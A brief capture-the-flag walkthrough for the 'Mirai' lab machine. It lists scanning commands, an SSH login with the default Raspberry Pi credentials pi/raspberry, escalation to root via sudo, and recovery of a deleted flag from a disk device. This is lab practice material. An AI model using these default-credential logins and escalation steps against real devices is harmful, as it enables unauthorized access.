# ****Mirai****

```bash
rustscan -a 10.10.10.48
```
![image](https://github.com/lufffe/Writeups/assets/90646635/53f36f81-47ca-43ad-8798-5e5dec19eb56)

```bash
gobuster dir -w directory-list-2.3-medium.txt -u [http://10.10.10.48](http://10.10.10.48/) -t 100 --no-error
```
![image](https://github.com/lufffe/Writeups/assets/90646635/ffdc4848-0b5d-4a2c-be85-171369c50aa4)

```bash
nmap -A -p 22,53,80,1337,32400,32469 10.10.10.48
```
![image](https://github.com/lufffe/Writeups/assets/90646635/5263a3cc-8384-477f-91bb-7eabe0323c24)

http://10.10.10.48/admin/index.php?login
![image](https://github.com/lufffe/Writeups/assets/90646635/8cb32f4e-c6a3-48e6-be56-10188ed73861)

![image](https://github.com/lufffe/Writeups/assets/90646635/c3314b7b-2017-42c0-979e-2ead5a3d4f56)

![image](https://github.com/lufffe/Writeups/assets/90646635/3691c423-5290-47e9-911f-628803f7dd91)

```bash
ssh pi@10.10.10.48 
```
password: raspberry

```bash
cat user.txt
```

```bash
sudo -l
```
![image](https://github.com/lufffe/Writeups/assets/90646635/96f15caa-5ec4-4b1b-9b3f-77cedf5f42f3)

```bash
sudo su
```
![image](https://github.com/lufffe/Writeups/assets/90646635/6f5c6af4-28d6-4752-b8e5-cf126b8b85de)

```bash
cat damnit.txt
```
![image](https://github.com/lufffe/Writeups/assets/90646635/bc47bb52-b339-41b5-acb3-b6e453f69cb8)

```bash
strings /dev/sdb
```
